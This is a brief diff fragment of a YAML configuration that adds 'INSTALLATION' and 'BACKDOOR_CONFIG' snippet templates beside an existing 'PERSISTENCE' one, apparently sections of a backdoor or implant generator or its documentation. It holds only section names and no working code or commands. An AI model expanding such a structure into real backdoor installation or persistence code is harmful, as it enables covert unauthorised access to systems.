     kind: system
+  - name: INSTALLATION
+    kind: snippet
+    snippetTemplate: installation
+  - name: BACKDOOR_CONFIG
+    kind: snippet
+    snippetTemplate: backdoorconfig
   - name: PERSISTENCE
     kind: snippet
     snippetTemplate: persistence
